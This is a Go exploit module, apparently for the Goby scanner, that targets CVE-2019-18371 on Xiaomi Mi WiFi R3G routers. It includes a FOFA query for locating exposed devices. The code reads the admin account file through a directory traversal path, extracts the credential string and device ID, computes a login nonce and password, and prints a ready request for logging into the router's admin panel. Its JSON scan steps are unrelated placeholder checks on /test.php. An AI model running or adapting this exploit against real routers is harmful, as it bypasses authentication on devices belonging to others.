package exploits

import (
  "crypto/sha1"
  "errors"
  "fmt"
  "git.gobies.org/goby/goscanner/goutils"
  "git.gobies.org/goby/goscanner/jsonvul"
  "git.gobies.org/goby/goscanner/scanconfig"
  "git.gobies.org/goby/httpclient"
  "math/rand"
  "regexp"
  "time"
)

func init() {
  expJson := `{
    "Name": " Xiaomi Mi WiFi R3G /login Permission Bypass Vulnerability",
    "Description": "<p>An issue was discovered on Xiaomi Mi WiFi R3G devices before 2.28.23-stable. </p><p>There is a directory traversal vulnerability to read arbitrary files via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.</p>",
    "Product": "mi-Router",
    "Homepage": "https://www.mi.com/",
    "DisclosureDate": "2019-12-24",
    "PostTime": "2024-07-23",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title=\"小米路由器\" && body=\"/cgi-bin/luci/web\"",
    "GobyQuery": "title=\"小米路由器\" && body=\"/cgi-bin/luci/web\"",
    "Level": "2",
    "Impact": "<p>An arbitrary file reading vulnerability (CVE-2019-18371) in the Xiaomi router system could allow us to obtain the login credentials of an administrator user, thereby bypassing the login verification and entering the background.</p>",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.mi.com\">https://www.mi.com</a></p>",
    "References": [
        "https://avd.aliyun.com/detail?id=AVD-2019-18371"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "2H1W",
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "小米Mi WiFi R3G /login 权限绕过漏洞",
            "Product": "mi-路由器",
            "Description": "<p>小米路由器是一款高配的智能路由器。</p><p>小米路由器系统存在的任意文件读取漏洞(CVE-2019-18371)可以使我们获得管理员用户的登录凭证，从而绕过登录验证，进入后台。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.mi.com\">https://www.mi.com</a><br></p>",
            "Impact": "<p>小米路由器系统存在的任意文件读取漏洞(CVE-2019-18371)可以使我们获得管理员用户的登录凭证，从而绕过登录验证，进入后台。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "两高一弱",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": " Xiaomi Mi WiFi R3G /login Permission Bypass Vulnerability",
            "Product": "mi-Router",
            "Description": "<p>An issue was discovered on Xiaomi Mi WiFi R3G devices before 2.28.23-stable.&nbsp;</p><p>There is a directory traversal vulnerability to read arbitrary files via a misconfigured NGINX alias, as demonstrated by api-third-party/download/extdisks../etc/config/account. With this vulnerability, the attacker can bypass authentication.<br></p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.mi.com\">https://www.mi.com</a><br></p>",
            "Impact": "<p>An arbitrary file reading vulnerability (CVE-2019-18371) in the Xiaomi router system could allow us to obtain the login credentials of an administrator user, thereby bypassing the login verification and entering the background.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "2H1W",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10976"
}`
  createNonce_nsajudhqbwdyqwbduvqvduqtv := func(mac string) string {
    type_ := 0
    deviceId := mac
    time_ := int(time.Now().Unix())
    rand.Seed(time.Now().UnixNano())
    random := rand.Intn(10000)
    return fmt.Sprintf("%d_%s_%d_%d", type_, deviceId, time_, random)
  }

  calcPassword_nah7732bygf2gbgf263g6f2 := func(nonce, accountStr string) string {
    h := sha1.New()
    h.Write([]byte(nonce + accountStr))
    return fmt.Sprintf("%x", h.Sum(nil))
  }

  getMessage_cnaeufauh3ifuniu1ubfb1uybyg := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
    makeRequest := httpclient.NewGetRequestConfig(fileUrl)
    makeRequest.VerifyTls = false
    makeRequest.Timeout = 10
    makeRequest.FollowRedirect = false
    if resp, err := httpclient.DoHttpRequest(hostInfo, makeRequest); err == nil {
      if resp.StatusCode == 200 {
        return resp.RawBody, nil
      }
    }
    return "", errors.New("fail")
  }
  setPayloadRequestHashdnqhd31hudy1bd31bygd1ggwqq := func(hostInfo *httpclient.FixUrl) (string, string, error) {
    //command为原始命令，如果需编码，请自行编码后使用
    //漏洞url地址
    vulurl := "/api-third-party/download/extdisks../etc/config/account"
    message1, err := getMessage_cnaeufauh3ifuniu1ubfb1uybyg(hostInfo, "/api-third-party/download/extdisks../etc/config/account")
    if err != nil {
      return "", "", err
    }
    regex := regexp.MustCompile(`admin'? '(.*)'`)
    matches := regex.FindStringSubmatch(message1)
    if len(matches) <= 1 {
      return "", "", errors.New("fail")
    }
    accountStr := matches[1]

    message2,err:=getMessage_cnaeufauh3ifuniu1ubfb1uybyg(hostInfo, "/cgi-bin/luci/web")
    if err != nil {
      return "", "", err
    }
    regex = regexp.MustCompile(`deviceId = '(.*?)'`)
    matches = regex.FindStringSubmatch(message2)
    if len(matches) <= 1 {
      return "", "", errors.New("fail")
    }
    mac:=matches[1]

    nonce := createNonce_nsajudhqbwdyqwbduvqvduqtv(mac)
    password := calcPassword_nah7732bygf2gbgf263g6f2(nonce, accountStr)
    //命令执行的结果，如果结果是编码的，请自己解码后返回，如果返回为空的字符串，则判断命令执行失败
    Result := "Please use the following packets to log in to the router background (you need to rewrite the generation after use):\r\nPOST /cgi-bin/luci/api/xqsystem/login HTTP/1.1\r\nHost: "+hostInfo.HostInfo+"\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\nContent-Length: 99\r\n\r\nusername=admin&password="+password+"&logtype=2&nonce="+nonce
    return Result, vulurl, nil
  }

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
      //setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
      runPayload := setPayloadRequestHashdnqhd31hudy1bd31bygd1ggwqq

      _, pocUrl, err := runPayload(hostInfo)
      if err != nil {
        return false
      }
      ss.VulURL = hostInfo.FixedHostInfo + pocUrl
      return true
    },
    func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
      Result, _, _ := setPayloadRequestHashdnqhd31hudy1bd31bygd1ggwqq(expResult.HostInfo)
      expResult.Output = Result
      expResult.Success = true
      return expResult
    },
  ))
}
